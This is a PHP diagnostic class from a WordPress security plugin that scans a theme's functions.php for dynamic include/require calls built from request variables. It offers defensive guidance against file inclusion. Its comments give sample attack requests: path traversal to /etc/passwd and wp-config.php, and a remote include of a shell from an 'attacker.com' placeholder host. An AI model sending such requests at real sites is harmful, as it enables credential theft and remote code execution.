<?php
/**
 * Theme File Include Security Diagnostic
 *
 * Checks theme files for unsafe dynamic include/require usage.
 * Dynamic include with user input = local/remote file inclusion (LFI/RFI).
 * Attacker includes malicious file = arbitrary code execution.
 *
 * **What This Check Does:**
 * - Searches theme files for include/require statements
 * - Detects dynamic paths (include \$_POST['file'])
 * - Checks for path validation/whitelist
 * - Tests for LFI patterns (include '../../etc/passwd')
 * - Searches for filter bypasses
 * - Returns severity for each unsafe include
 *
 * **Why This Matters:**
 * Dynamic include with unsanitized path = file inclusion vulnerability.
 * Attacker controls file path. Includes malicious file.
 * Code executes. Total compromise.
 *
 * **Business Impact:**
 * Theme template loader uses: include(\"/templates/\" . \$_GET['page']).
 * Attacker requests: ?page=../../../../../../etc/passwd. Includes system
 * file. Or: ?page=http://attacker.com/shell.php. Includes remote shell.
 * Attacker has code execution. With validation: only whitelisted files
 * includable. Include attack impossible.
 *
 * **Philosophy Alignment:**
 * - #8 Inspire Confidence: Theme includes are safe
 * - #9 Show Value: Prevents LFI/RFI attacks
 * - #10 Beyond Pure: Path validation by design
 *
 * **Related Checks:**
 * - Plugin Local File Inclusion Risk (similar risk)
 * - Theme Direct Database Access (complementary)
 * - File Permission Security (permissions)
 *
 * **Learn More:**
 * File inclusion security: https://wpshadow.com/kb/theme-file-include
 * Video: Preventing file inclusion attacks (11min): https://wpshadow.com/training/lfi-rfi
 *
 * @package    WPShadow
 * @subpackage Diagnostics
 * @since 1.6093.1200
 */

declare(strict_types=1);

namespace WPShadow\Diagnostics;

use WPShadow\Core\Diagnostic_Base;
use WPShadow\Core\Upgrade_Path_Helper;

if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Theme File Include Security Diagnostic
 *
 * Flags dynamic includes that may allow file inclusion attacks.
 *
 * **Detection Pattern:**
 * 1. Find all theme PHP files
 * 2. Search for include/require statements
 * 3. Detect dynamic paths (with variables)
 * 4. Check if path validated/sanitized
 * 5. Test for directory traversal patterns
 * 6. Return each unsafe include
 *
 * **Real-World Scenario:**
 * Theme has template system:
 * ```
 * include(TEMPLATEPATH . '/' . \$_GET['template']);
 * ```
 * Attacker requests: ?template=../../wp-config.php. Includes file with
 * database credentials. Attacker reads output. With validation: only
 * files in /templates/ directory includable. Attack impossible.
 *
 * **Implementation Notes:**
 * - Scans active theme files
 * - Detects dynamic include/require usage
 * - Checks for path validation
 * - Severity: critical (no validation), high (weak validation)
 * - Treatment: whitelist allowed files or use include_once carefully
 *
 * @since 1.6093.1200
 */
class Diagnostic_Theme_File_Include_Security extends Diagnostic_Base {

	/**
	 * The diagnostic slug
	 *
	 * @var string
	 */
	protected static $slug = 'theme-file-include-security';

	/**
	 * The diagnostic title
	 *
	 * @var string
	 */
	protected static $title = 'Theme File Include Security';

	/**
	 * The diagnostic description
	 *
	 * @var string
	 */
	protected static $description = 'Checks theme files for unsafe dynamic include/require usage';

	/**
	 * The family this diagnostic belongs to
	 *
	 * @var string
	 */
	protected static $family = 'security';

	/**
	 * Run the diagnostic check.
	 *
	 * @since 1.6093.1200
	 * @return array|null Finding array if issue found, null otherwise.
	 */
	public static function check() {
		$theme_dir = wp_get_theme()->get_stylesheet_directory();
		$functions_file = $theme_dir . '/functions.php';

		if ( ! file_exists( $functions_file ) ) {
			return null;
		}

		$content = file_get_contents( $functions_file, false, null, 0, 60000 );
		if ( false === $content ) {
			return null;
		}

		$patterns = array(
			'include($_',
			'require($_',
			'include_once($_',
			'require_once($_',
		);

		$matches = array();
		foreach ( $patterns as $pattern ) {
			if ( false !== strpos( $content, $pattern ) ) {
				$matches[] = $pattern;
			}
		}

		if ( empty( $matches ) ) {
			return null;
		}

		$finding = array(
			'id'           => self::$slug,
			'title'        => self::$title,
			'description'  => __( 'Unsafe dynamic file includes detected in theme', 'wpshadow' ),
			'severity'     => 'high',
			'threat_level' => 80,
			'auto_fixable' => false,
			'kb_link'      => 'https://wpshadow.com/kb/theme-file-include-security',
			'context'      => array(
				'why'            => __( 'Dynamic file includes with user‑controlled input are a classic path to Local File Inclusion (LFI) or Remote File Inclusion (RFI). When a theme builds a path using $_GET or $_POST values without strict validation, attackers can traverse directories to read sensitive files (wp‑config.php, logs) or, in certain configurations, execute remote code. OWASP Top 10 2021 ranks Injection #3 and Broken Access Control #1, and file inclusion vulnerabilities often enable both by exposing configuration secrets or allowing code execution. Verizon’s 2024 DBIR reports that roughly three‑quarters of breaches involve the human element and that web application attacks are a leading pattern; attackers frequently chain simple path manipulation with leaked credentials or misconfigurations to escalate access. The business impact is severe: data leaks, database credential exposure, full site compromise, and reputational damage. For ecommerce sites, LFI can expose payment configuration, enabling fraud or skimming. Even in non‑commercial sites, inclusion attacks can deface content or distribute malware to visitors, triggering search engine warnings and long‑term traffic loss. Unlike some vulnerabilities, file inclusion is often easy to exploit once discovered, and automated scanners actively look for these patterns. Using whitelisted template maps and strict path validation is a low‑cost fix that eliminates the risk and makes your theme more maintainable. It also provides a clear audit trail for security reviews.', 'wpshadow' ),
				'recommendation' => __( '1. Replace dynamic includes with a strict whitelist of allowed templates.
2. Use sanitize_key() or sanitize_text_field() on template identifiers.
3. Resolve paths with realpath() and verify they stay within the theme directory.
4. Block directory traversal sequences (../, ..\) explicitly.
5. Remove remote include options and disable allow_url_include at server level.
6. Avoid including files based on query parameters; use routing maps instead.
7. Use locate_template() with a fixed array of templates.
8. Add automated tests for template selection logic.
9. Review child themes and custom code for similar patterns.
10. Log and alert on unexpected template requests or failures.', 'wpshadow' ),
			),
			'details'      => array(
				'matches' => $matches,
			),
		);

		return Upgrade_Path_Helper::add_upgrade_path( $finding, 'security', 'file-inclusion', self::$slug );
	}
}
